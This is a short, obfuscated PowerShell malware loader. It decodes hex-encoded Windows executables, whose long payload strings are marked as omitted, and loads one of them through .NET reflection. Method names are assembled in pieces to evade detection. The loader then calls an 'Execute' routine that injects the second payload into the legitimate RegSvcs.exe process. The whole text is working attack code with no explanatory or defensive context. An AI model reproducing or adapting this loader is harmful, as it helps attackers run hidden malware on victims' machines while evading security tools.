Try{
function Informer {
param($GhJnVsXs)$GhJnVsXs = $GhJnVsXs -split '(..)' | ? { $_ }
$Workstation = [Convert]
ForEach ($UX2 in $GhJnVsXs){$Workstation::ToInt32($UX2,16)}}
Try{
[byte[]] $Ghost  = Informer('4D5A9.G.G.G.G3.....G.G.G.G'.Replace('.G','0')) # The omitted '4D5A9.G.G.G.G3.....G.G.G.G' is actually a 131932 character long string.
}catch{}
[byte[]] $BOOKS  = Informer('4D5A9MOSMOS...MOSMOS'.Replace('MOS','0')) # The omitted '4D5A9MOSMOS...MOSMOS' is actually a 139575 character long string.
}catch{}
$T = 'Get'
$M = $T + 'Method'
$I = 'Invoke'
$T = $T + 'Type'
$L = 'Load'
$Q0 = [Reflection.Assembly]
$B = $Q0::$L($BOOKS)
$B = $B.$T('NewPE2.PE')
$B = $B.$M('Execute')
$Mn = 'C:\Windows\Mic'
$Ub = $Mn + 'rosoft.NET\Fr'
$z = $Ub + 'amework\v4.0'
$VT = $z + '.30319\'
$XQ = $VT + 'RegSvcs.exe'
$B = $B.$I($null,[object[]] ($XQ,$Ghost))
